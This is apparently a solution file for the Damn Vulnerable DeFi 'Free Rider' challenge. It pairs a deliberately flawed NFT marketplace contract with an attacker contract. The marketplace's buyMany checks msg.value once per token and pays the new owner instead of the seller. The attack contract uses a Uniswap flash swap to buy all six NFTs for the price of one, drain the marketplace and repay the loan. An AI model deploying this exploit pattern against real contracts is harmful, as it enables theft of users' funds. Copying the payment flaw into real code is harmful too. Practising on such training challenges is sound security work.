// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableNFT.sol";
import "hardhat/console.sol";

/**
 * @title FreeRiderNFTMarketplace
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderNFTMarketplace is ReentrancyGuard {

    using Address for address payable;

    DamnValuableNFT public token;
    uint256 public amountOfOffers;

    // tokenId -> price
    mapping(uint256 => uint256) private offers;

    event NFTOffered(address indexed offerer, uint256 tokenId, uint256 price);
    event NFTBought(address indexed buyer, uint256 tokenId, uint256 price);
    
    constructor(uint8 amountToMint) payable {
        require(amountToMint < 256, "Cannot mint that many tokens");
        token = new DamnValuableNFT();

        for(uint8 i = 0; i < amountToMint; i++) {
            token.safeMint(msg.sender);
        }        
    }

    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external nonReentrant {
        require(tokenIds.length > 0 && tokenIds.length == prices.length);
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _offerOne(tokenIds[i], prices[i]);
        }
    }

    function _offerOne(uint256 tokenId, uint256 price) private {
        require(price > 0, "Price must be greater than zero");

        require(
            msg.sender == token.ownerOf(tokenId),
            "Account offering must be the owner"
        );

        require(
            token.getApproved(tokenId) == address(this) ||
            token.isApprovedForAll(msg.sender, address(this)),
            "Account offering must have approved transfer"
        );

        offers[tokenId] = price;

        amountOfOffers++;

        emit NFTOffered(msg.sender, tokenId, price);
    }

    function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _buyOne(tokenIds[i]);
        }
    }

    function _buyOne(uint256 tokenId) private {       
        uint256 priceToPay = offers[tokenId];
        require(priceToPay > 0, "Token is not being offered");

        require(msg.value >= priceToPay, "Amount paid is not enough");

        amountOfOffers--;

        // transfer from seller to buyer
        token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller
        payable(token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }    

    receive() external payable {}
}

import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../WETH9.sol";

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
}

contract AttackNFTMarketplace is IERC721Receiver {

    IUniswapV2Pair private pair;
    IERC20 private erc20weth;
    WETH9 private weth;
    FreeRiderNFTMarketplace private nftMarketplace;
    DamnValuableNFT private token;
    address private buyer;

    constructor(address _pair, address _weth, address _nftMarketplace, address _nft, address _buyer) {
        pair = IUniswapV2Pair(_pair);
        weth = WETH9(payable(_weth));
        erc20weth = IERC20(_weth);
        nftMarketplace = FreeRiderNFTMarketplace(payable(_nftMarketplace));
        token = DamnValuableNFT(_nft);
        buyer = _buyer;
    }

    function exploit() public {
        pair.swap(16 ether, 0, address(this), bytes('not empty'));
        payable(msg.sender).transfer(address(this).balance);
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        console.log("Attacker contract address : ", address(this));
        console.log("WETH balance before : " , weth.balanceOf(address(this)));
        console.log("Eth balance before ", address(this).balance);
        weth.withdraw(16 ether);
        console.log("WETH balance after : " , weth.balanceOf(address(this)));
        console.log("Eth balance after ", address(this).balance);
        token.setApprovalForAll(address(nftMarketplace), true);
        uint256[] memory ids = new uint256[](6);
        for (uint i = 0; i < 6; i++) {
            ids[i] = i;
        }
        nftMarketplace.buyMany{value: 15 ether}(ids);
        // for (uint i = 0; i < 6; i++) {
        //     console.log("Owner of NFT : ", token.ownerOf(ids[i]));
        // }
        console.log("Eth balance after buying all NFTs ", address(this).balance);
        console.log("Eth remaining balance on marketplace : ", address(nftMarketplace).balance);

        for (uint i = 0; i < 6; i++) {
            token.safeTransferFrom(address(this), buyer, i);
        }
        console.log("Eth balance after sending NFTs to buyer ", address(this).balance);
        console.log("Attacker ETH balance : ", address(tx.origin).balance);

        weth.deposit{value: 16.05 ether}();
        assert(weth.transfer(msg.sender, 16.05 ether));
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        override
        returns (bytes4) 
    {
        // console.log("called by default");
        return IERC721Receiver.onERC721Received.selector;
    }

    /**
    get 15 WETH from Uniswap pool
    Uniswap pool will callback "uniswapV2Call" function, 
    inside this function convert WETH to ETH
    then call buyMany([0,0,0]) [check if safeTransferFrom works with "from" and "to" as same addresses]
    convert ETH back to WETH and send back to uniswap
     */

    receive() external payable{}

}
